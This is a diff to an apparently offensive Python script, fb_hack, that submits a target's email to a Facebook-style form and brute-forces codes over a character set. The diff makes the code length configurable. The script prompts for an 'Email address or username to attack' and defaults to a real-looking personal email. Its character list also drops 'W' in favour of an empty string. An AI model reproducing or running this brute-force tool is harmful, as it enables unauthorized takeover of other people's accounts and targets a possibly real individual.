@@ -39,7 +39,7 @@ def sleepy(counter):
       print(x, end='\r')
     sleep(1)
 
-def fb_hack(email, codex):
+def fb_hack(email, codex, respect):
   soup = BeautifulSoup()
   browser = mechanize.Browser()
   browser.set_handle_robots(False)
@@ -56,7 +56,7 @@ def fb_hack(email, codex):
   browser.form['email'] = email
   browser.submit()
   counter = 0
-  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z","!","#","$","%","^","&","*"], repeat=8):
+  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
     counter += 1
     if counter <= codex:
@@ -160,4 +160,5 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
-fb_hack(ehack, reset)
+past = int(input('Length: ') or 6)
+fb_hack(ehack, reset, past)
